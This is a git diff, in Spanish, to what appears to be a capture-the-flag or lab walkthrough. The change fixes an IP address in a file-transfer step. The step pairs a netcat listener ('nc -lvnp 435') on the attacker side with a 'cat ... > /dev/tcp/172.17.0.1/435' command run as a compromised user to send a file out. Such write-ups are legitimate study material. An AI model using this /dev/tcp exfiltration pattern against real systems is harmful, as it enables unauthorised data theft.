@@ -64,5 +64,5 @@ En el directorio actual de valentina, tenemos un archivo llamado ```profile_pict
 
 Para pasarlo, escucharemos en una terminal con ```nc -lvnp 435 > test.jpeg``` y en el usuario de valentina ejecutamos el siguiente comando:
 ```
-cat profile_picture.jpeg > /dev/tcp/171.17.0.1/435
+cat profile_picture.jpeg > /dev/tcp/172.17.0.1/435
 ```
